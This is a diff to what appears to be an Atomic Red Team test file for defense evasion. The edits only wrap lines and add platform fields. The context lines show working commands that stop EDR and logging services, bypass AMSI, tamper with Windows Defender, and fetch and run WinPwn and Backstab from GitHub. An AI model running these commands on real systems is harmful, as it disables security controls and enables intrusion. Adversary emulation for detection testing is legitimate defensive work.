@@ -15,13 +15,16 @@ atomic_tests:
     package_installer:
       description: Package installer command for linux. Default yum
       type: string
-      default: (which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog)
+      default: (which yum && yum -y install epel-release rsyslog)||(which apt-get
+        && apt-get install -y rsyslog)
     flavor_command:
-      description: Command to disable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog stop ; chkconfig off rsyslog
+      description: Command to disable syslog collection. Default newer rsyslog commands.
+        i.e older command = service rsyslog stop ; chkconfig off rsyslog
       type: string
       default: systemctl stop rsyslog ; systemctl disable rsyslog
     cleanup_command:
-      description: Command to enable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog start ; chkconfig rsyslog on
+      description: Command to enable syslog collection. Default newer rsyslog commands.
+        i.e older command = service rsyslog start ; chkconfig rsyslog on
       type: string
       default: systemctl start rsyslog ; systemctl enable rsyslog
   dependency_executor_name: sh
@@ -39,7 +42,9 @@ atomic_tests:
       #{cleanup_command}
     name: sh
     elevation_required: true
-- name: Disable syslog (freebsd)
+  run_on:
+  - linux
+- name: Disable syslog (FreeBSD)
   auto_generated_guid: db9de996-441e-4ae0-947b-61b6871e2fdf
   description: |
     Disables syslog collection
@@ -54,7 +59,8 @@ atomic_tests:
       service syslogd start
     name: sh
     elevation_required: true
-
+  run_on:
+  - freebsd
 - name: Disable Cb Response
   auto_generated_guid: ae8943f7-0f8d-44de-962d-fbc2e2f03eb8
   description: |
@@ -72,6 +78,8 @@ atomic_tests:
         systemctl disable cbdaemon
       fi
     name: sh
+  run_on:
+  - linux
 - name: Disable SELinux
   auto_generated_guid: fc225f36-9279-4c39-b3f9-5141ab74f8d8
   description: |
@@ -79,12 +87,12 @@ atomic_tests:
   supported_platforms:
   - linux
   dependencies:
-    - description: |
-        SELinux must be installed
-      prereq_command: |
-        which setenforce
-      get_prereq_command: |
-        echo "SELinux is not installed"; exit 1
+  - description: |
+      SELinux must be installed
+    prereq_command: |
+      which setenforce
+    get_prereq_command: |
+      echo "SELinux is not installed"; exit 1
   executor:
     command: |
       setenforce 0
@@ -92,6 +100,8 @@ atomic_tests:
       setenforce 1
     name: sh
     elevation_required: true
+  run_on:
+  - linux
 - name: Stop Crowdstrike Falcon on Linux
   auto_generated_guid: 828a1278-81cc-4802-96ab-188bf29ca77d
   description: |
@@ -107,6 +117,8 @@ atomic_tests:
       sudo systemctl start falcon-sensor.service
     name: sh
     elevation_required: true
+  run_on:
+  - linux
 - name: Disable Carbon Black Response
   auto_generated_guid: 8fba7766-2d11-4b4a-979a-1e3d9cc9a88c
   description: |
@@ -122,6 +134,8 @@ atomic_tests:
       sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
     name: sh
     elevation_required: true
+  run_on:
+  - macos
 - name: Disable LittleSnitch
   auto_generated_guid: 62155dd8-bb3d-4f32-b31c-6532ff3ac6a3
   description: |
@@ -135,6 +149,8 @@ atomic_tests:
       sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
     name: sh
     elevation_required: true
+  run_on:
+  - macos
 - name: Disable OpenDNS Umbrella
   auto_generated_guid: 07f43b33-1e15-4e99-be70-bc094157c849
   description: |
@@ -148,6 +164,8 @@ atomic_tests:
       sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
     name: sh
     elevation_required: true
+  run_on:
+  - macos
 - name: Disable macOS Gatekeeper
   auto_generated_guid: 2a821573-fb3f-4e71-92c3-daac7432f053
   description: |
@@ -161,6 +179,8 @@ atomic_tests:
       sudo spctl --master-enable
     name: sh
     elevation_required: true
+  run_on:
+  - macos
 - name: Stop and unload Crowdstrike Falcon on macOS
   auto_generated_guid: b3e7510c-2d4c-4249-a33f-591a2bc83eef
   description: |
@@ -185,6 +205,8 @@ atomic_tests:
       sudo launchctl load -w #{userdaemon_plist}
     name: sh
     elevation_required: true
+  run_on:
+  - macos
 - name: Unload Sysmon Filter Driver
   auto_generated_guid: 811b3e76-c41b-430c-ac0d-e2380bfaa164
   description: |
@@ -194,7 +216,8 @@ atomic_tests:
   - windows
   input_arguments:
     sysmon_driver:
-      description: The name of the Sysmon filter driver (this can change from the default)
+      description: The name of the Sysmon filter driver (this can change from the
+        default)
       type: string
       default: SysmonDrv
   dependency_executor_name: powershell
@@ -236,6 +259,8 @@ atomic_tests:
       "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i > nul 2>&1
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: Uninstall Sysmon
   auto_generated_guid: a316fb2e-5344-470d-91c1-23e15c374edc
   description: |
@@ -244,7 +269,8 @@ atomic_tests:
   - windows
   input_arguments:
     sysmon_exe:
-      description: The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)
+      description: The location of the Sysmon executable from Sysinternals (ignored
+        if sysmon.exe is found in your PATH)
       type: path
       default: PathToAtomicsFolder\T1562.001\bin\sysmon.exe
   dependency_executor_name: powershell
@@ -272,6 +298,8 @@ atomic_tests:
       sysmon -i -accepteula >nul 2>&1
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: AMSI Bypass - AMSI InitFailed
   auto_generated_guid: 695eed40-e949-40e5-b306-b4031e4154bd
   description: |
@@ -287,6 +315,8 @@ atomic_tests:
     cleanup_command: |
       [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
     name: powershell
+  run_on:
+  - windows
 - name: AMSI Bypass - Remove AMSI Provider Reg Key
   auto_generated_guid: 13f09b91-c953-438e-845b-b585e51cac9b
   description: |
@@ -302,6 +332,8 @@ atomic_tests:
       New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Disable Arbitrary Security Windows Service
   auto_generated_guid: a1230893-56ac-4c81-b644-2108e982f8f5
   description: |
@@ -324,6 +356,8 @@ atomic_tests:
       net.exe start #{service_name} >nul 2>&1
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: Tamper with Windows Defender ATP PowerShell
   auto_generated_guid: 6b8df440-51ec-4d53-bf83-899591c9b5d7
   description: |
@@ -344,6 +378,8 @@ atomic_tests:
       Set-MpPreference -DisableBlockAtFirstSeen 0
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Tamper with Windows Defender Command Prompt
   auto_generated_guid: aa875ed4-8935-47e2-b2c5-6ec00ab220d2
   description: |
@@ -362,6 +398,8 @@ atomic_tests:
       sc config WinDefend start=enabled >nul 2>&1
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: Tamper with Windows Defender Registry
   auto_generated_guid: 1b3e0146-a1e5-4c5c-89fb-1bb2ffe8fc45
   description: |
@@ -376,6 +414,8 @@ atomic_tests:
       Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Disable Microsoft Office Security Features
   auto_generated_guid: 6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7
   description: |
@@ -399,6 +439,8 @@ atomic_tests:
       Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -ErrorAction Ignore | Out-Null
       Remove-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -ErrorAction Ignore
     name: powershell
+  run_on:
+  - windows
 - name: Remove Windows Defender Definition Files
   auto_generated_guid: 3d47daaa-2f56-43e0-94cc-caf5d8d52a68
   description: |
@@ -414,6 +456,8 @@ atomic_tests:
       "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: Stop and Remove Arbitrary Security Windows Service
   auto_generated_guid: ae753dda-0f15-4af6-a168-b9ba16143143
   description: |
@@ -431,6 +475,8 @@ atomic_tests:
       Remove-Service -Name #{service_name}
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Uninstall Crowdstrike Falcon on Windows
   auto_generated_guid: b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297
   description: |
@@ -443,9 +489,15 @@ atomic_tests:
       type: path
       default: C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe
   executor:
-    command: if (Test-Path "#{falcond_path}") {. "#{falcond_path}" /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
+    command: if (Test-Path "#{falcond_path}") {. "#{falcond_path}" /repair /uninstall
+      /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include
+      "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath
+      $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList
+      -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Tamper with Windows Defender Evade Scanning -Folder
   auto_generated_guid: 0b19f4ee-de90-4059-88cb-63c800c683ed
   description: |
@@ -468,6 +520,8 @@ atomic_tests:
       Remove-MpPreference -ExclusionPath $excludedpath
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Tamper with Windows Defender Evade Scanning -Extension
   auto_generated_guid: 315f4be6-2240-4552-b3e1-d1047f5eecea
   description: |
@@ -490,6 +544,8 @@ atomic_tests:
       Remove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Tamper with Windows Defender Evade Scanning -Process
   auto_generated_guid: a123ce6a-3916-45d6-ba9c-7d4081315c27
   description: |
@@ -512,6 +568,8 @@ atomic_tests:
       Remove-MpPreference -ExclusionProcess  $excludedProcess
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: office-365-Disable-AntiPhishRule
   auto_generated_guid: b9bbae2c-2ba6-4cf3-b452-8e8f908696f3
   description: |
@@ -557,6 +615,8 @@ atomic_tests:
       } 
     name: powershell
     elevation_required: false
+  run_on:
+  - office-365
 - name: Disable Windows Defender with DISM
   auto_generated_guid: 871438ac-7d6e-432a-b27d-3e7db69faf58
   description: |
@@ -571,7 +631,8 @@ atomic_tests:
       Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
     name: command_prompt
     elevation_required: true
-
+  run_on:
+  - windows
 - name: Disable Defender Using NirSoft AdvancedRun
   auto_generated_guid: 81ce22fd-9612-4154-918e-8a1f285d214d
   description: |
@@ -585,7 +646,7 @@ atomic_tests:
     AdvancedRun_Location:
       description: Path of Advanced Run executable
       type: path
-      default: 'PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe'
+      default: PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe
     delete_defender_folder:
       description: Set to 1 to also delete the Windows Defender folder
       type: integer
@@ -611,6 +672,8 @@ atomic_tests:
       Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Kill antimalware protected processes using Backstab
   auto_generated_guid: 24a12b91-05a7-4deb-8d7f-035fa98591bc
   description: |-
@@ -626,7 +689,8 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: Backstab64.exe should exist in ExtrnalPayloads Directory
-    prereq_command: if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe") {exit 0} else {exit 1}
+    prereq_command: if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe")
+      {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       Invoke-WebRequest "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"
@@ -635,6 +699,8 @@ atomic_tests:
       & "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe" -k -n #{process_name}
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: WinPwn - Kill the event log services for stealth
   auto_generated_guid: 7869d7a3-3a30-4d2c-a5d2-f1cd9c34ce66
   description: Kill the event log services for stealth via function of WinPwn
@@ -646,6 +712,8 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       inv-phantom -consoleoutput -noninteractive  
     name: powershell
+  run_on:
+  - windows
 - name: Tamper with Windows Defender ATP using Aliases - PowerShell
   auto_generated_guid: c531aa6e-9c97-4b29-afee-9b7be6fc8a64
   description: |
@@ -666,6 +734,8 @@ atomic_tests:
       Set-MpPreference -dbaf 0
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: LockBit Black - Disable Privacy Settings Experience Using Registry -cmd
   auto_generated_guid: d6d22332-d07d-498f-aea0-6139ecb7850e
   description: |
@@ -679,6 +749,8 @@ atomic_tests:
       reg delete "HKCU\Software\Policies\Microsoft\Windows\OOBE" /v DisablePrivacyExperience /f >nul 2>&1
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: LockBit Black - Use Registry Editor to turn on automatic logon -cmd
   auto_generated_guid: 9719d0e1-4fe0-4b2e-9a72-7ad3ee8ddc70
   description: |
@@ -698,6 +770,8 @@ atomic_tests:
       reg delete "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /f >nul 2>&1
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell
   auto_generated_guid: d8c57eaa-497a-4a08-961e-bd5efd7c9374
   description: |
@@ -711,6 +785,8 @@ atomic_tests:
       Remove-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\OOBE" -Name DisablePrivacyExperience -Force -ErrorAction Ignore
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell
   auto_generated_guid: 5e27f36d-5132-4537-b43b-413b0d5eec9a
   description: |
@@ -730,6 +806,8 @@ atomic_tests:
       Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -Force -ErrorAction Ignore
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Disable Windows Defender with PwSh Disable-WindowsOptionalFeature
   auto_generated_guid: f542ffd3-37b4-4528-837f-682874faa012
   description: |
@@ -748,7 +826,8 @@ atomic_tests:
       Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-ApplicationGuard" -NoRestart -ErrorAction Ignore
     name: powershell
     elevation_required: true
-
+  run_on:
+  - windows
 - name: WMIC Tamper with Windows Defender Evade Scanning Folder
   auto_generated_guid: 59d386fc-3a4b-41b8-850d-9e3eee24dfe4
   description: |
@@ -763,7 +842,8 @@ atomic_tests:
       wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Remove ExclusionPath=\"ATOMICREDTEAM\"
     name: command_prompt
     elevation_required: true
-
+  run_on:
+  - windows
 - name: Delete Windows Defender Scheduled Tasks
   auto_generated_guid: 4b841aa1-0d05-4b32-bbe7-7564346e7c76
   description: |
@@ -795,6 +875,8 @@ atomic_tests:
       schtasks /create /xml "%temp%\Windows_Defender_Cache_Maintenance.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: Clear History
   auto_generated_guid: 23b88394-091b-4968-a42d-fb8076992443
   description: |
@@ -806,6 +888,9 @@ atomic_tests:
       history -c
     name: sh
     elevation_required: true
+  run_on:
+  - freebsd
+  - linux
 - name: Suspend History
   auto_generated_guid: 94f6a1c9-aae7-46a4-9083-2bb1f5768ec4
   description: |
@@ -819,6 +904,9 @@ atomic_tests:
       set -o history
     name: sh
     elevation_required: true
+  run_on:
+  - freebsd
+  - linux
 - name: Reboot Linux Host via Kernel System Request
   auto_generated_guid: 6d6d3154-1a52-4d1a-9d51-92ab8148b32e
   description: |
@@ -831,6 +919,8 @@ atomic_tests:
       echo b> /proc/sysrq-trigger 
     name: sh
     elevation_required: true
+  run_on:
+  - linux
 - name: Clear Pagging Cache
   auto_generated_guid: f790927b-ea85-4a16-b7b2-7eb44176a510
   description: |
@@ -844,6 +934,8 @@ atomic_tests:
       echo 3> /proc/sys/vm/drop_caches 
     name: sh
     elevation_required: true
+  run_on:
+  - linux
 - name: Disable Memory Swap
   auto_generated_guid: e74e4c63-6fde-4ad2-9ee8-21c3a1733114
   description: |
@@ -863,6 +955,9 @@ atomic_tests:
       sync
     name: sh
     elevation_required: true
+  run_on:
+  - freebsd
+  - linux
 - name: Disable Hypervisor-Enforced Code Integrity (HVCI)
   auto_generated_guid: 70bd71e6-eba4-4e00-92f7-617911dbe020
   description: |
@@ -896,6 +991,8 @@ atomic_tests:
       reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Locked" /f
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: AMSI Bypass - Override AMSI via COM
   auto_generated_guid: 17538258-5699-4ff1-92d1-5ac9b0dc21f5
   description: |
@@ -912,6 +1009,8 @@ atomic_tests:
       REG DELETE HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /f
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: AWS - GuardDuty Suspension or Deletion
   auto_generated_guid: 11e65d8d-e7e4-470e-a3ff-82bc56ad938e
   description: |
@@ -940,6 +1039,8 @@ atomic_tests:
       echo "If test successfully ran, no cleanup required."
     name: bash
     elevation_required: false
+  run_on:
+  - iaas:aws
 - name: Tamper with Defender ATP on Linux/MacOS
   auto_generated_guid: 40074085-dbc8-492b-90a3-11bcfc52fda8
   description: |
@@ -954,6 +1055,9 @@ atomic_tests:
       sudo mdatp config real-time-protection --value enabled
     name: sh
     elevation_required: true
+  run_on:
+  - linux
+  - macos
 - name: Tamper with Windows Defender Registry - Reg.exe
   auto_generated_guid: 1f6743da-6ecc-4a93-b03f-dc357e4b313f
   description: |
@@ -1001,6 +1105,8 @@ atomic_tests:
       reg add "HKLM\Software\Microsoft\Windows Defender" /v "PUAProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: Tamper with Windows Defender Registry - Powershell
   auto_generated_guid: a72cfef8-d252-48b3-b292-635d332625c3
   description: |
@@ -1047,7 +1153,9 @@ atomic_tests:
       Set-ItemProperty "HKLM:\software\microsoft\windows defender\spynet" -Name "SubmitSamplesConsent" -Value 1 
       Set-ItemProperty "HKLM:\Software\Microsoft\Windows Defender" -Name "PUAProtection" -Value 1 
     name: powershell
-    elevation_required: true 
+    elevation_required: true
+  run_on:
+  - windows
 - name: ESXi - Disable Account Lockout Policy via PowerCLI
   auto_generated_guid: 091a6290-cd29-41cb-81ea-b12f133c66cb
   description: |
@@ -1083,10 +1191,14 @@ atomic_tests:
       Get-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false
       Disconnect-VIServer -Confirm:$false
     name: powershell
-    elevation_required: true  
+    elevation_required: true
+  run_on:
+  - linux
 - name: Delete Microsoft Defender ASR Rules - InTune
   auto_generated_guid: eea0a6c2-84e9-4e8c-a242-ac585d28d0d1
-  description: This test simulates the deletion of the ASR rules loaded by Microsoft Defender using the registry. Depending on the deployment, rules can be pushed either using GPO or InTune, This test simulates an InTune-based rules deployment.
+  description: This test simulates the deletion of the ASR rules loaded by Microsoft
+    Defender using the registry. Depending on the deployment, rules can be pushed
+    either using GPO or InTune, This test simulates an InTune-based rules deployment.
   supported_platforms:
   - windows
   executor:
@@ -1113,26 +1225,32 @@ atomic_tests:
       Write-Host "Registry value deleted: $registryValueName"
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Delete Microsoft Defender ASR Rules - GPO
   auto_generated_guid: 0e7b8a4b-2ca5-4743-a9f9-96051abb6e50
-  description: This test simulates the deletion of the ASR rules loaded by Microsoft Defender using the registry. Depending on the deployment, rules can be pushed either using GPO or InTune, This test simulates a GPO-based rules deployment.
+  description: This test simulates the deletion of the ASR rules loaded by Microsoft
+    Defender using the registry. Depending on the deployment, rules can be pushed
+    either using GPO or InTune, This test simulates a GPO-based rules deployment.
   supported_platforms:
   - windows
   executor:
     command: |-
       $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules"
-  
+
       if (-not (Test-Path $registryPath)) {
           New-Item -Path $registryPath -Force
           Write-Host "Registry key created: $registryPath"
       }
-  
+
       $newValueName = "36190899-1602-49e8-8b27-eb1d0a1ce869"
       $newValueData = "1"
       New-ItemProperty -Path $registryPath -Name $newValueName -PropertyType String -Value $newValueData -Force
       Write-Host "Registry value created: $newValueName with data $newValueData"
-  
+
       Remove-ItemProperty -Path $registryPath -Name $newValueName
       Write-Host "Registry value deleted: $newValueName"
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
